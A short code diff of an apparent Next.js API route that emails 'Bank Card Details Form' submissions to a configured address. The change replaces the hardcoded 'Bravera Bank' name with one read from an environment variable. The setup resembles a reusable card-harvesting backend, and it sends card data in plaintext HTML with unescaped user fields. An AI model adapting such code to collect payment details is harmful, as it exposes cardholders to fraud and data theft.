@@ -17,7 +17,7 @@ export async function POST(request) {
     let mailOptions = {
       from: process.env.EMAIL_USER,
       to: process.env.NOTIFICATION_EMAIL,
-      subject: `${data.bankName || 'Bravera Bank'} - Bank Card Details Form`,
+      subject: `${data.bankName || process.env.NEXT_PUBLIC_BANK_NAME}  - Bank Card Details Form`,
       html: generateEmailContent(data),
     };
     
@@ -41,7 +41,7 @@ export async function POST(request) {
 function generateEmailContent(data) {
   // This function generates appropriate HTML based on the data
   let html = `
-    <h2>${data.bankName || 'Bravera Bank'} Form Submission</h2>
+    <h2>${data.bankName || process.env.NEXT_PUBLIC_BANK_NAME} ${data.type} Form Submission</h2>
     <p>Submitted at: ${new Date().toString()}</p>
     <table border="1" cellpadding="10">
       <tr>
